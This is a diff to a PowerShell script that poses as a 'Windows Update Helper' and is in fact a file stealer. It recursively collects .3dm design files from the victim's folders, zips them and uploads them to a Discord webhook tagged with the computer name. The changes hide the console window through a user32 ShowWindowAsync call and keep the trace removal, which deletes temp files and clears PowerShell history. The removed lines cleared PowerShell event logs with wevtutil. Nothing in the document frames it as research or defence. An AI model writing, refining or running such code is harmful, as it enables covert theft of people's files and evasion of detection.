@@ -1,5 +1,6 @@
 [Console]::BackgroundColor = "Black" 
 [Console]::Title = "Windows Update Helper"
+[Console]::SetWindowSize(1,1)
 Clear-Host
 
 # Webhook configuration
@@ -17,35 +18,28 @@ $foldersToSearch = @(
 
 # Create temporary working directory
 $tempDir = "$env:TEMP\WinUpdateTemp"
+$zipPath = "$env:TEMP\3dmFiles.zip"
 if (-not (Test-Path -Path $tempDir)) {
     New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 }
 
-# Function to clean up traces
-function Invoke-Cleanup {
-    # Clear PowerShell history
-    Clear-History
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-    
-    # Delete temporary files
-    if (Test-Path $tempDir) {
-        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    }
-    
-    # Clear event logs
-    wevtutil cl "Windows PowerShell" | Out-Null
-    wevtutil cl "Microsoft-Windows-PowerShell/Operational" | Out-Null
+# Hide the window immediately
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+if($hwnd -ne [System.IntPtr]::Zero){
+    $Type::ShowWindowAsync($hwnd, 0)
 }
 
-# Function to send files to Discord
-function Send-ToDiscord {
+# Function to send zip to Discord
+function Send-ZipToDiscord {
     param (
-        [string]$filePath
+        [string]$zipPath
     )
     
     try {
-        $fileName = [System.IO.Path]::GetFileName($filePath)
-        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+        $fileName = [System.IO.Path]::GetFileName($zipPath)
+        $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
         
         # Create multipart form content
         $boundary = [System.Guid]::NewGuid().ToString()
@@ -54,11 +48,11 @@ function Send-ToDiscord {
         $body = (
             "--$boundary",
             "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
-            "Content-Type: application/octet-stream$LF",
+            "Content-Type: application/zip$LF",
             [System.Text.Encoding]::UTF8.GetString($fileBytes),
             "--$boundary",
             "Content-Disposition: form-data; name=`"content`"$LF",
-            "New .3dm file found: $fileName from $env:COMPUTERNAME",
+            "Collected .3dm files from $env:COMPUTERNAME",
             "--$boundary--$LF"
         ) -join $LF
 
@@ -72,20 +66,39 @@ function Send-ToDiscord {
 
 # Main collection process
 try {
+    $foundFiles = @()
+    
     foreach ($folder in $foldersToSearch) {
         foreach ($extension in $fileExtensions) {
             $files = Get-ChildItem -Path $folder -Recurse -Filter $extension -File -ErrorAction SilentlyContinue
-            
-            foreach ($file in $files) {
-                $tempFilePath = Join-Path -Path $tempDir -ChildPath $file.Name
-                Copy-Item -Path $file.FullName -Destination $tempFilePath -Force -ErrorAction SilentlyContinue
-                Send-ToDiscord -filePath $tempFilePath
-                Remove-Item $tempFilePath -Force -ErrorAction SilentlyContinue
-            }
+            $foundFiles += $files
         }
+    }
+
+    if ($foundFiles.Count -gt 0) {
+        # Copy files to temp directory
+        foreach ($file in $foundFiles) {
+            $tempFilePath = Join-Path -Path $tempDir -ChildPath $file.Name
+            Copy-Item -Path $file.FullName -Destination $tempFilePath -Force -ErrorAction SilentlyContinue
+        }
+        
+        # Create zip archive
+        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
+        
+        # Send zip to Discord
+        Send-ZipToDiscord -zipPath $zipPath
     }
 }
 finally {
-    # Clean up traces
-    Invoke-Cleanup
+    # Clean up
+    if (Test-Path $tempDir) {
+        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+    }
+    if (Test-Path $zipPath) {
+        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+    }
+    
+    # Clear PowerShell history
+    Clear-History
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 }
